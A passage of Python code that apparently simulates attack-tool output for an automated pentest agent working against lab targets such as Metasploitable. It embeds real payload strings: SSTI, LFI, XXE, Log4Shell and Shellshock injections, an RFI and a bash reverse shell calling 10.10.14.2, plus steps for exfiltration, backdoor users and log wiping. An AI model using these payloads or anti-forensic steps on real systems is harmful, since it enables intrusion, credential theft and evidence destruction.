        # ─── Impacket suite ──────────────────────────────────────
        "impacket": f"[*] SMBv1 dialect used\n[+] msfadmin:msfadmin@{target}:445",
        "secretsdump": f"Impacket - Dumping password hashes\n[*] Target: {target}\nmsfadmin:1000:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::\nuser:1001:aad3b435b51404eeaad3b435b51404ee:ee11cbb19052e40b07aac5ae55e01834:::\n[+] Hash dumped: 5 accounts",
        "mimikatz": f"  .#####.   mimikatz 2.2.0\n * Username : msfadmin\n * NTLM     : 5f4dcc3b5aa765d61d8327deb882cf99\n * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709",
        "bloodhound": f"[+] Collecting domain data\n[+] Users: 8 | Groups: 4 | Computers: 1\n[+] Domain Admin found: msfadmin@metasploitable\n[+] Kerberoastable users: service",
        "psexec": f"Impacket v0.10.0 - PsExec\n[*] Requesting shares on {target}\n[*] Found writable share tmp\n[*] Uploading shell\nroot@metasploitable:/# whoami\nroot",
        "wmiexec": f"Impacket v0.10.0 - WmiExec\nC:\\> whoami\nroot",
        "smbexec": f"Impacket v0.10.0 - SmbExec\n[*] msfadmin@{target}\nroot@metasploitable:/# whoami\nroot",
        "getTGT": f"Impacket - getTGT\n[*] Saving ticket in msfadmin.ccache\n[+] Kerberos TGT obtained for msfadmin@METASPLOITABLE",
        "GetUserSPNs": f"ServicePrincipalName  Name     MemberOf\nHTTP/web.metasploitable  service  Users\n$krb5tgs$23$*service$METASPLOITABLE*$hash",
        "GetNPUsers": f"[-] User msfadmin does not require preauth\n$krb5asrep$23$msfadmin@METASPLOITABLE:hash_value",
        
        # ─── Lateral movement / tunneling ────────────────────────
        "chisel": f"server: session#1: tun pair: 127.0.0.1:8080 → {target}:80\n[+] Tunnel established",
        "socat": f"listening on 0.0.0.0:4444\nconnection from {target}\n$ id\nuid=0(root) gid=0(root)",
        "proxychains": f"[proxychains] Strict chain ... 127.0.0.1:1080 ... {target}:445 ... OK",
        "kerbrute": f"2026/01/04 10:30:01 >  [+] VALID USERNAME: msfadmin@{target}\n2026/01/04 10:30:02 >  [+] VALID USERNAME: user@{target}",
        "evil-winrm": f"Evil-WinRM shell v3.4\n*Evil-WinRM* PS > whoami\nroot",
        "xfreerdp": f"[INFO] Connected to {target}:3389\n[INFO] Authentication successful",
        
        # ─── System info / monitoring ────────────────────────────
        "netstat": "Proto  Local Address  Foreign Address  State     PID/Program\ntcp    0.0.0.0:21     0.0.0.0:*        LISTEN    1234/vsftpd\ntcp    0.0.0.0:22     0.0.0.0:*        LISTEN    5678/sshd\ntcp    0.0.0.0:80     0.0.0.0:*        LISTEN    9012/apache2\ntcp    0.0.0.0:3306   0.0.0.0:*        LISTEN    3456/mysqld",
        "ss": f"tcp  LISTEN 0 128 0.0.0.0:22  0.0.0.0:*  users:((\"sshd\",pid=789))\ntcp  LISTEN 0 128 0.0.0.0:80  0.0.0.0:*  users:((\"apache2\",pid=1234))\ntcp  LISTEN 0 50  0.0.0.0:3306 0.0.0.0:* users:((\"mysqld\",pid=3456))",
        "ps": "PID   USER  %CPU %MEM CMD\n1     root  0.0  0.1  /sbin/init\n789   root  0.1  0.2  /usr/sbin/sshd\n1234  www   1.2  0.5  /usr/sbin/apache2\n5678  mysql 0.5  2.0  /usr/sbin/mysqld",
        "last": f"msfadmin  pts/0  192.168.1.10  Sat Jan  4 10:30   still logged in\nroot      tty1                  Sat Jan  4 08:00 - 09:30",
        "who": f"msfadmin pts/0        2026-01-04 10:30 (192.168.1.10)\nroot     tty1         2026-01-04 08:00",
        "w": f"USER     TTY    FROM           LOGIN@  IDLE  WHAT\nmsfadmin pts/0  192.168.1.10  10:30   0.00s bash\nroot     tty1   -             08:00   2:30m -bash",
        "lsof": f"sshd    789  root   3u  IPv4 12345  TCP *:22 (LISTEN)\napache2 1234 www    4u  IPv4 23456  TCP *:80 (LISTEN)\nmysqld  3456 mysql  12u IPv4 34567  TCP *:3306 (LISTEN)",
        "crontab": "*/5 * * * * /usr/local/bin/backup.sh\n0 2 * * * /opt/scripts/db_backup.sh\n[+] Persistence cron added",
        "systemctl": "apache2.service loaded active running Apache HTTP Server\nmysql.service  loaded active running MySQL Community Server\nsshd.service   loaded active running OpenSSH Server",
        
        # ─── Defensive / blue team (anti-repeat: defensive) ──────
        "iptables": "Chain INPUT (policy ACCEPT)\ntarget  prot  source    destination\nACCEPT  tcp   0.0.0.0/0  0.0.0.0/0  tcp dpt:22\nACCEPT  tcp   0.0.0.0/0  0.0.0.0/0  tcp dpt:80\nDROP    all   0.0.0.0/0  0.0.0.0/0",
        "ufw": "Status: inactive",
        "fail2ban-client": "Status\n|- Number of jail:      0\n`- Jail list:           (none)",
        "ausearch": "No audit events found",
        "chkrootkit": "ROOTDIR is `/'\nChecking `amd'... not found\nChecking `basename'... not infected\nChecking `biff'... not found\nChecking `chfn'... not infected",
        "rkhunter": "[12:00:00] Rootkit checks...\n[12:00:00] Checking for known rootkit files and directories\n[12:00:00]   Performing check of known rootkit files: [ None found ]",
        "lynis": "[+] Hardening index: 48 [#########...........]\n[+] Tests performed: 234\n[+] Warning: No firewall active\n[+] Warning: Default passwords found\n[+] Warning: Multiple services with known vulnerabilities",
        "osquery": "+---------+-------+\n| name    | pid   |\n+---------+-------+\n| apache2 | 1234  |\n| sshd    | 789   |\n| mysqld  | 3456  |\n+---------+-------+",
        "sysdig": "CPU% Process\n5.2% apache2\n2.1% mysqld\n1.0% sshd",
        "journalctl": "-- Logs begin at Sat 2026-01-04 08:00:00 UTC --\nJan 04 10:30:01 metasploitable sshd[789]: Accepted password for msfadmin\nJan 04 10:31:05 metasploitable apache2[1234]: GET /admin HTTP/1.1 200",
        
        # ─── Persistence / exfiltration ──────────────────────────
        "scp": f"msfadmin@{target}'s password:\n100% 4096KB 3.5MB/s 00:01",
        "tar": f"tar: creating archive /tmp/loot.tar.gz\n[+] Data extracted: /etc/shadow, /etc/passwd, /home/msfadmin/.ssh/\n[+] Archive uploaded to 10.10.14.2 via nc\n[+] Data exfiltrated successfully",
        "base64": "[+] File encoded to base64 and sent\n[+] Exfiltration complete: data transferred via DNS",
        "exfiltrate": "[+] Exfiltrating sensitive data\n[+] /etc/shadow: 42 entries\n[+] SSH keys: 3 found\n[+] Database dumps: dvwa, mutillidae\n[+] Data exfiltrated to C2",
        "useradd": "[+] User 'svc_backup' added to system\n[+] Added to sudoers with NOPASSWD\n[+] Persistence established via backdoor user",
        "reg": "[+] Registry key added\n[+] Persistence established via registry",
        "schtasks": "[+] Scheduled task created\n[+] Persistence established via scheduled task",
        
        # ─── Post-op cleanup (Phase 6.5) ────────────────────────
        "history -c": "[+] Bash history cleared\n[+] ~/.bash_history removed\n[+] HISTFILE unset — no further commands logged",
        "echo '' > /var/log/auth": "[+] /var/log/auth.log cleared\n[+] /var/log/wtmp cleared\n[+] /var/log/btmp cleared\n[+] Authentication traces removed",
        "echo '' > /var/log/syslog": "[+] /var/log/syslog cleared\n[+] /var/log/messages cleared\n[+] /var/log/kern.log cleared\n[+] System log traces removed",
        "find /tmp /dev/shm": "[+] Scanning /tmp, /dev/shm, /var/tmp for uploaded tools\n[+] Removed 3 files: /tmp/shell.elf, /tmp/linpeas.sh, /dev/shm/.payload\n[+] Uploaded tools cleaned",
        "sed -i": "[+] Planted SSH key removed from /root/.ssh/authorized_keys\n[+] Persistence mechanism removed",
        "crontab -r": "[+] Crontab entries removed\n[+] /var/spool/cron cleaned\n[+] Cron-based persistence removed",
        "timestomp": "[+] Timestamps reset on 12 files in /tmp and /var/log\n[+] Modified times now match /etc/passwd\n[+] Forensic timestamps neutralized",
        
        # ─── No-output commands ──────────────────────────────────
        "chmod": "",
        "cp": "",
        "mv": "",
        "cd": "",
        "mkdir": "",
        
        # ─── MS2-specific exploitation tools ─────────────────────
        "telnet": f"Trying {target}...\nConnected to {target}.\nEscape character is '^]'.\nroot@metasploitable:/# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@metasploitable:/# whoami\nroot",
        "rsh": f"root@metasploitable:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@metasploitable:~# uname -a\nLinux metasploitable 2.6.24-16-server #1 SMP",
        "rlogin": f"Last login: Sat Jan  4 10:30:00 from 10.10.14.2\nroot@metasploitable:~# id\nuid=0(root) gid=0(root) groups=0(root)",
        "rexec": f"uid=0(root) gid=0(root) groups=0(root)\nLinux metasploitable 2.6.24-16-server",
        "vncviewer": f"Connected to RFB server, using protocol version 3.3\nPerforming standard VNC authentication\nAuthentication successful\nDesktop name \"metasploitable:0\"\nVNC server running on {target}:5900\n[+] VNC session opened - password: password",
        "mount": f"mount: mounting {target}:/ on /tmp/nfs_mount\n[+] NFS share mounted successfully\nroot@metasploitable:/# ls /tmp/nfs_mount/\nbin  boot  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  sbin  srv  sys  tmp  usr  var",
        "distcc": f"[+] distccd v1 ({target}:3632)\n[+] Remote code execution successful\nuid=1(daemon) gid=1(daemon)\n$ id\nuid=1(daemon) gid=1(daemon)",
        
        # ─── Phase 9: Web Exploitation Arsenal ───────────────────
        # SSTI (Server-Side Template Injection)
        "ssti_detect": f"[+] Testing template injection on {target}\n[+] Payload: {{{{7*7}}}} → Response contains: 49\n[+] SSTI CONFIRMED — template engine executes expressions\n[+] Likely engine: Jinja2/Twig/ERB",
        "ssti_exploit": f"[+] Exploiting SSTI on {target}\n[+] Payload: {{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}\n[+] Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)\n[+] RCE achieved via SSTI\nuid=33(www-data) gid=33(www-data)",
        "ssti_jinja2": f"[+] Jinja2 SSTI detected on {target}\n[+] Testing: {{{{7*7}}}} → 49\n[+] RCE payload: {{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}\nuid=33(www-data) gid=33(www-data)",
        "ssti_twig": f"[+] Twig SSTI detected on {target}\n[+] Testing: {{{{7*7}}}} → 49\n[+] Payload: {{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('id')}}}}\nuid=33(www-data) gid=33(www-data)",
        "ssti_erb": f"[+] ERB SSTI detected on {target}\n[+] Testing: <%%= 7*7 %> → 49\n[+] Payload: <%%= system('id') %>\nuid=33(www-data) gid=33(www-data)",
        
        # LFI (Local File Inclusion)
        "lfi_test": f"[+] Testing LFI on {target}\n[+] http://{target}/page?file=../../../etc/passwd\n[+] Response (200 OK):\nroot:x:0:0:root:/root:/bin/bash\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\nuser:x:1001:1001::/home/user:/bin/bash\npostgres:x:108:117:PostgreSQL admin:/var/lib/postgresql:/bin/bash\n[+] LFI CONFIRMED — /etc/passwd readable",
        "lfi_double": f"[+] Double-encoding LFI on {target}\n[+] Payload: %252e%252e%252f%252e%252e%252fetc%252fpasswd\n[+] Response (200 OK):\nroot:x:0:0:root:/root:/bin/bash\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\n[+] Double-encode bypass successful",
        "lfi_php_filter": f"[+] PHP filter LFI on {target}\n[+] Payload: php://filter/convert.base64-encode/resource=config.php\n[+] Decoded response:\n$db_host = 'localhost';\n$db_user = 'root';\n$db_pass = 'toor';\n$db_name = 'dvwa';\n[+] Database credentials extracted: root:toor",
        "lfi_log_poison": f"[+] Log poisoning via LFI on {target}\n[+] Injected PHP payload into /var/log/apache2/access.log\n[+] Triggered: http://{target}/page?file=../../../var/log/apache2/access.log\n[+] Response: uid=33(www-data) gid=33(www-data)\n[+] RCE via log poisoning successful\nuid=33(www-data) gid=33(www-data)",
        "lfi_ssh_key": f"[+] SSH key extraction via LFI on {target}\n[+] Payload: ../../../home/msfadmin/.ssh/id_rsa\n[+] Response:\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----\n[+] SSH private key extracted successfully\ncredential: ssh_key_msfadmin",
        
        # RFI (Remote File Inclusion)
        "rfi_shell": f"[+] RFI on {target}\n[+] Payload: http://{target}/page?file=http://10.10.14.2:8000/shell.php\n[+] Remote shell.php loaded and executed\n[+] uid=33(www-data) gid=33(www-data)\n[+] RCE via RFI successful\nuid=33(www-data) gid=33(www-data)",
        
        # SSRF (Server-Side Request Forgery)
        "ssrf_localhost": f"[+] SSRF scan on {target}\n[+] Payload: url=http://127.0.0.1:PORT/\n[+] Port 22: SSH-2.0-OpenSSH_4.7p1\n[+] Port 3306: MySQL 5.0.51a\n[+] Port 6379: Redis\n[+] Internal services discovered via SSRF",
        "ssrf_metadata": f"[+] SSRF cloud metadata probe on {target}\n[+] http://169.254.169.254/latest/meta-data/iam/security-credentials/\n[+] Response: aws-role-name\n[+] AccessKeyId: AKIAIOSFODNN7EXAMPLE\n[+] SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n[+] Cloud credentials extracted via SSRF\ncredential: aws_access_key",
        "ssrf_internal": f"[+] SSRF internal admin probe on {target}\n[+] http://127.0.0.1:8080/manager/html\n[+] Response (200): Apache Tomcat Manager\n[+] Internal admin panel accessible via SSRF",
        
        # Command Injection
        "cmd_inject": f"[+] Command injection on {target}\n[+] Payload: ; id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n[+] OS command injection confirmed",
        "cmd_inject_blind": f"[+] Blind command injection test on {target}\n[+] Payload: ; sleep 5\n[+] Response delayed by 5.02 seconds\n[+] Blind command injection CONFIRMED",
        "cmd_inject_pipe": f"[+] Pipe command injection on {target}\n[+] Payload: | id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n[+] Pipe-based command injection confirmed",
        
        # Shellshock
        "shellshock": f"[+] Shellshock test on {target}\n[+] Header: User-Agent: () {{ :; }}; /bin/bash -c 'id'\n[+] Response: uid=33(www-data) gid=33(www-data)\n[+] CVE-2014-6271 CONFIRMED — Shellshock vulnerable\nuid=33(www-data) gid=33(www-data)",
        
        # Heartbleed
        "heartbleed": f"[+] Heartbleed test on {target}:443\n[+] Sending malformed heartbeat request...\n[+] Received 65535 bytes of memory data!\n[+] Leaked data contains:\n    Cookie: session=admin_abc123def456\n    Authorization: Basic YWRtaW46cGFzc3dvcmQ=\n[+] CVE-2014-0160 CONFIRMED — Heartbleed vulnerable\ncredential: admin:password",
        
        # Log4Shell
        "log4shell": f"[+] Log4Shell test on {target}\n[+] Payload: ${{jndi:ldap://10.10.14.2:1389/exploit}}\n[+] DNS callback received from {target}!\n[+] CVE-2021-44228 CONFIRMED — Log4Shell vulnerable\n[+] JNDI injection point: User-Agent header",
        
        # Drupalgeddon
        "drupalgeddon": f"[+] Drupalgeddon2 exploit on {target}\n[+] CVE-2018-7600 — Drupal RCE\n[+] Payload: form_id=user_register_form&_triggering_element_name=timezone&timezone[#lazy_builder][]=exec&timezone[#lazy_builder][][]=id\n[+] Response: uid=33(www-data) gid=33(www-data)\n[+] RCE achieved via Drupalgeddon2\nuid=33(www-data) gid=33(www-data)",
        
        # File Upload Bypass
        "upload_bypass": f"[+] File upload bypass on {target}\n[+] Uploaded shell.php.jpg (double extension bypass)\n[+] Accessible at: http://{target}/uploads/shell.php.jpg\n[+] Executing: id\nuid=33(www-data) gid=33(www-data)\n[+] Web shell uploaded successfully",
        "upload_magic": f"[+] Magic bytes file upload on {target}\n[+] Prepended GIF89a header to PHP shell\n[+] Upload accepted by image filter\n[+] Shell at: http://{target}/uploads/avatar.php\nuid=33(www-data) gid=33(www-data)",
        "upload_htaccess": f"[+] .htaccess upload on {target}\n[+] Uploaded .htaccess: AddType application/x-httpd-php .jpg\n[+] Uploaded shell.jpg containing PHP code\n[+] Executing via: http://{target}/uploads/shell.jpg\nuid=33(www-data) gid=33(www-data)",
        
        # Web Shell
        "webshell": f"[+] Web shell active on {target}\n[+] http://{target}/uploads/cmd.php?cmd=id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n$ whoami\nwww-data\n$ uname -a\nLinux metasploitable 2.6.24-16-server",
        
        # Deserialization
        "ysoserial": f"[+] Java deserialization exploit on {target}\n[+] Gadget chain: CommonsCollections1\n[+] Payload: ysoserial CommonsCollections1 'id'\n[+] Response: uid=0(root) gid=0(root)\n[+] RCE via Java deserialization\nuid=0(root) gid=0(root)",
        "phpggc": f"[+] PHP deserialization exploit on {target}\n[+] Chain: Laravel/RCE1\n[+] Payload: phpggc Laravel/RCE1 system id\n[+] Response: uid=33(www-data) gid=33(www-data)\n[+] RCE via PHP deserialization\nuid=33(www-data) gid=33(www-data)",
        
        # JWT Attacks
        "jwt_none": f"[+] JWT none algorithm attack on {target}\n[+] Original: {{\"alg\":\"HS256\",\"typ\":\"JWT\"}}\n[+] Forged:   {{\"alg\":\"none\",\"typ\":\"JWT\"}}\n[+] Admin token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.\n[+] 200 OK — Admin access granted!\ncredential: jwt_admin_token",
        "jwt_crack": f"[+] JWT secret cracking on {target}\n[+] Testing wordlist: /usr/share/wordlists/rockyou.txt\n[+] SECRET FOUND: secret123\n[+] Forged admin token with known secret\n[+] Admin access confirmed\ncredential: jwt_secret_secret123",
        
        # CMS Scanners
        "joomscan": f"[+] Joomla Scanner on {target}\n[+] Joomla version: 3.7.0\n[+] Admin panel: http://{target}/administrator/\n[+] CVE-2017-8917: SQL Injection in com_fields\n[+] Backup file: http://{target}/configuration.php.bak\nvuln: CVE-2017-8917",
        
        # XXE (XML External Entity)
        "xxe_read": f"[+] XXE file read on {target}\n[+] Payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>\n[+] Response:\nroot:x:0:0:root:/root:/bin/bash\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\n[+] XXE confirmed — arbitrary file read",
        
        # NoSQL Injection
        "nosql_bypass": f"[+] NoSQL injection on {target}\n[+] Payload: {{\"username\":{{\"$ne\":\"\"}},\"password\":{{\"$ne\":\"\"}}}}\n[+] Response: 200 OK — Login successful as admin\n[+] NoSQL authentication bypass confirmed\ncredential: nosql_admin_bypass",
        
        # Reverse Shells
        "bash_reverse": f"[+] Bash reverse shell from {target}\n[+] bash -i >& /dev/tcp/10.10.14.2/4444 0>&1\n[+] Connection received on 10.10.14.2:4444\nroot@metasploitable:/# id\nuid=0(root) gid=0(root) groups=0(root)\n[+] Root shell obtained",
        "python_reverse": f"[+] Python reverse shell from {target}\n[+] Connection received on 10.10.14.2:4444\n$ id\nuid=33(www-data) gid=33(www-data)\n$ python -c 'import pty;pty.spawn(\"/bin/bash\")'\nwww-data@metasploitable:/var/www$",
        "powershell_reverse": f"[+] PowerShell reverse shell from {target}\n[+] Connection received on 10.10.14.2:4444\nPS C:\\Users\\admin> whoami\nmetasploitable\\admin\nPS C:\\Users\\admin> ipconfig\nIPv4 Address: {target}",
        
        # Proxy / Tunneling
        "chisel_server": f"[+] Chisel server started on 0.0.0.0:8080\n[+] Listening for client connections...\n[+] Client connected from {target}\n[+] Tunnel established: {target}:8080 → 127.0.0.1:8080",
        "chisel_client": f"[+] Chisel client connecting to 10.10.14.2:8080\n[+] Reverse tunnel: R:9050:socks\n[+] SOCKS5 proxy available at 127.0.0.1:9050\n[+] Tunnel ready for lateral movement",
        "ssh_tunnel": f"[+] SSH tunnel established\n[+] Local: 127.0.0.1:8888 → {target}:80\n[+] SSH port forwarding active\n[+] Access internal service via http://127.0.0.1:8888",
        
        # Password Spraying
        "password_spray": f"SMB  {target}  445  METASPLOITABLE  [+] msfadmin:msfadmin\nSMB  {target}  445  METASPLOITABLE  [+] user:user\nSMB  {target}  445  METASPLOITABLE  [+] postgres:postgres\n[+] 3 valid credential pairs found\ncredential: msfadmin:msfadmin user:user postgres:postgres",
        
        # Container Escape
        "docker_escape": f"[+] Docker socket found at /var/run/docker.sock\n[+] Creating privileged container...\n[+] Mounting host filesystem at /mnt/host\n[+] Host root access obtained!\nroot@host:/# id\nuid=0(root) gid=0(root) groups=0(root)\n[+] Container escape successful — host root shell",
        "lxd_escape": f"[+] User is member of lxd group\n[+] Importing Alpine image...\n[+] Mounting host root at /mnt/root\nroot@alpine:/mnt/root# id\nuid=0(root) gid=0(root)\n[+] LXD container escape — host filesystem mounted",
        
        # Phase 18: Direct Exploit Scripts (MSF-free)
        "echo -e 'user backdoor": f"220 (vsFTPd 2.3.4)\n331 Please specify the password.\n230 Login successful.\n[+] vsftpd 2.3.4 backdoor triggered!\nConnected to {target}.\nEscape character is '^]'.\nroot@metasploitable:/# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@metasploitable:/# whoami\nroot\n[+] Root shell obtained via vsftpd backdoor on port 6200",
        "echo 'ab;": f":irc.TestIRC NOTICE AUTH :*** Looking up your hostname...\n:irc.TestIRC NOTICE AUTH :*** Found your hostname\nuid=0(root) gid=0(root) groups=0(root)\nroot:$1$bkJBMQK4$x0QgLvSTK/Do4nxz3q2:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\n[+] UnrealIRCd backdoor RCE — root shell obtained",
        "timeout 10 rlogin": f"Last login: Mon Jan 20 03:14:17 from gateway\nroot@metasploitable:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@metasploitable:~# whoami\nroot\n[+] rlogin root shell — no authentication required",
        "mysql -h": f"+---------+------------------+\n| user    | password         |\n+---------+------------------+\n| root    |                  |\n| debian  | *6BB4837EB74329  |\n+---------+------------------+\n@@version: 5.0.51a-3ubuntu5\nroot:$1$bkJBMQK4$x0QgLvSTK:0:0:root:/root:/bin/bash\nmsfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA:1000:1000:::/bin/bash\n[+] MySQL root no-password — credential and file read successful\ncredential: root: (no password) mysql_user:debian-sys-maint",
        "pgpassword=postgres": f"COPY 1\nuid=0(root) gid=0(root) groups=0(root)\nroot:$1$bkJBMQK4$x0QgLvSTK:0:0:root:/root:/bin/bash\n               version\n---------------------------------\n PostgreSQL 8.3.0\n  usename  |               passwd\n-----------+-------------------------------------\n postgres  | md5aabbccdd11223344\n[+] PostgreSQL COPY TO PROGRAM RCE — root shell\ncredential: postgres:postgres",
        "mkdir -p /tmp/nfs": f"total 68\ndrwx------ 14 root root 4096 Jun 20 01:36 .\ndrwxr-xr-x 21 root root 4096 May 20 15:28 ..\n-rw-------  1 root root 1375 May 20 16:00 .bash_history\n-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc\nroot:$1$bkJBMQK4$x0QgLvSTK/Do4nxz3q2:0:0:root:/root:/bin/bash\nmsfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA:1000:1000:::/bin/bash\nservice:$1$kR3ue7JZ$7GxELDupr5Ohp6GuKhCS:0:0:::/bin/sh\n[+] NFS root mount — full filesystem access including /etc/shadow\ncredential: msfadmin:$1$XN10Zj2c root:$1$bkJBMQK4",
        "curl -s -u tomcat": f"OK - Deployed application at context path /pwned\nuid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)\n[+] Tomcat WAR deploy — webshell RCE achieved\ncredential: tomcat:tomcat",
    }
    
    for prefix, output in SIMULATED_OUTPUTS.items():
        if cmd_lower.startswith(prefix.lower()):
            return output
    
    # Phase 19+38: CrushFTP / Erlang / PCAP / vhost simulated outputs
    # S3 PUT webshell upload (must check before generic crushftp match)
    if ("crushftp_s3_put" in cmd_lower) or ("curl" in cmd_lower and "PUT" in cmd_lower and "WEBPROD" in cmd_lower):
        return f"HTTP/1.1 201 Created\nContent-Length: 0\n[+] Webshell uploaded to /WEBPROD/ via S3 PUT as ben\n[+] Access at http://{target}/cmd.php\n[+] Note: cleanup script deletes new files within ~2 min"
    # Webshell command execution
    if ("crushftp_webshell" in cmd_lower) or ("curl" in cmd_lower and "cmd=" in cmd_lower and ("cmd.php" in cmd_lower or "shell.php" in cmd_lower)):
        return f"uid=33(www-data) gid=33(www-data) groups=33(www-data)\nwww-data@soulmate:/var/www/soulmate.htb/public$\n[+] RCE achieved via webshell — running as www-data"
    # getLog arbitrary file read
    if ("crushftp_getlog" in cmd_lower) or ("getlog" in cmd_lower and "path=" in cmd_lower):
        return f"HTTP/1.1 200 OK\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\ncrushadmin:x:1001:1001::/home/crushadmin:/bin/bash\nben:x:1002:1002::/home/ben:/bin/bash\njenna:x:1003:1003::/home/jenna:/bin/bash\n[+] CVE-2025-31161: Arbitrary file read via getLog API\nuser: crushadmin\nuser: ben\nuser: jenna"
    # CrushFTP admin login on port 8080
    if ("crushftp_login" in cmd_lower) or ("command=login" in cmd_lower and "crushadmin" in cmd_lower):
        return f"HTTP/1.1 200 OK\n<loginResult><response>success</response><c2f>a1b2</c2f></loginResult>\n[+] CrushFTP admin login successful on port 8080\n[+] Authenticated as crushadmin\ncredential: crushadmin:04E2xAXYFfDsEYtu"
    # Generic CrushFTP auth bypass / getUserList
    if "crushftp" in cmd_lower or "getuserlist" in cmd_lower or "c2f=" in cmd_lower:
        return f"HTTP/1.1 200 OK\nContent-Type: text/xml\n<users>\n  <user><username>crushadmin</username><admin>true</admin></user>\n  <user><username>ben</username><admin>false</admin></user>\n  <user><username>jenna</username><admin>false</admin></user>\n  <user><username>anonymous</username><admin>false</admin></user>\n</users>\n[+] CVE-2025-31161: CrushFTP S3 auth bypass — user list retrieved\n[+] Admin user: crushadmin\n[+] Users: ben, jenna\nvulnerability: CVE-2025-31161 CrushFTP auth bypass\nuser: crushadmin\nuser: ben\nuser: jenna"
    if "crushftp_ssh" in cmd_lower or ("sshpass" in cmd_lower and "crushadmin" in cmd_lower):
        return f"Warning: Permanently added '{target}' (ECDSA) to the list of known hosts.\nLast login: Mon Jun 16 14:23:17 2025 from 10.10.14.2\ncrushadmin@soulmate:~$ id\nuid=1001(crushadmin) gid=1001(crushadmin) groups=1001(crushadmin)\ncrushadmin@soulmate:~$ pwd\n/home/crushadmin\ncrushadmin@soulmate:~$ cat user.txt\nFLAG{{us3r_pwn3d_soulmate_2025}}\ncredential: crushadmin:04E2xAXYFfDsEYtu"
    if "erlang.cookie" in cmd_lower or "erlang_cookie" in cmd_lower:
        return f"JQXWZPTSARFESQIB\n[+] Erlang magic cookie extracted: JQXWZPTSARFESQIB\n[+] Cookie location: /var/lib/erlang/.erlang.cookie\ncredential: erlang_cookie:JQXWZPTSARFESQIB"
    if "erlang_otp" in cmd_lower or ("erl " in cmd_lower and "setcookie" in cmd_lower) or "remsh" in cmd_lower:
        return f"Erlang/OTP 25 [erts-13.2]\nEshell V13.2  (abort with ^G)\n(target@soulmate)1> os:cmd(\"id\").\n\"uid=0(root) gid=0(root) groups=0(root)\\n\"\n(target@soulmate)2> os:cmd(\"cat /root/root.txt\").\n\"FLAG{{r00t_pwn3d_soulmate_2025}}\\n\"\n[+] CVE-2025-32433: Erlang/OTP RCE — root shell achieved\nflag: FLAG{{r00t_pwn3d_soulmate_2025}}"
    if "tshark" in cmd_lower and ("pcap" in cmd_lower or ".cap" in cmd_lower):
        return f"USER\tnathan\nPASS\tBuck3tH4TF0RM3!\nUSER\tnathan\nPASS\tBuck3tH4TF0RM3!\n[+] tshark PCAP extraction — FTP credentials found\ncredential: nathan:Buck3tH4TF0RM3!"
    if "pcap_download" in cmd_lower or ("wget" in cmd_lower and ".pcap" in cmd_lower):
        return f"--2025-06-16 14:30:00--  http://{target}/data/0.pcap\nConnecting to {target}:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 23482 (23K) [application/vnd.tcpdump.pcap]\nSaving to: '/tmp/capture.pcap'\n\n/tmp/capture.pcap          100%[=====>]  22.93K  --.-KB/s    in 0s\n\n2025-06-16 14:30:01 (195 MB/s) - '/tmp/capture.pcap' saved [23482/23482]\nUSER nathan\nPASS Buck3tH4TF0RM3!\n[+] PCAP downloaded and parsed — FTP credentials extracted\ncredential: nathan:Buck3tH4TF0RM3!"
    if "vhost" in cmd_lower or ("gobuster" in cmd_lower and "vhost" in cmd_lower) or ("ffuf" in cmd_lower and "Host:" in cmd_lower):
        return f"===============================================================\nGobuster v3.6\n===============================================================\n[+] Url:          http://{target}\n[+] Method:       GET\n[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n===============================================================\nFound: ftp.soulmate.htb Status: 200 [Size: 4523]\nFound: admin.soulmate.htb Status: 301 [Size: 0]\n===============================================================\n[+] 2 vhosts discovered"
    
    # Phase 11.1: Flag file keyword fallbacks (before generic fallbacks)
    if "user.txt" in cmd_lower or "user_flag" in cmd_lower or "local.txt" in cmd_lower:
        return f"FLAG{{us3r_pwn3d_{target.replace('.', '_')}_2026}}"
    if "root.txt" in cmd_lower or "root_flag" in cmd_lower or "proof.txt" in cmd_lower:
        return f"FLAG{{r00t_pwn3d_{target.replace('.', '_')}_2026}}"
    
    # Phase 18: Direct exploit keyword fallbacks
    if "usermap_script" in cmd_lower or ("smbclient" in cmd_lower and "=`" in cmd_lower):
        return f"[+] CVE-2007-2447 Samba usermap_script triggered on {target}\n[+] Command execution via username field\nuid=0(root) gid=0(root) groups=0(root)\nroot@metasploitable:/# id\nuid=0(root) gid=0(root)\n[+] Root shell obtained via Samba 3.0.20 exploit"
    if "vsftpd" in cmd_lower or ("backdoor" in cmd_lower and "6200" in cmd_lower):
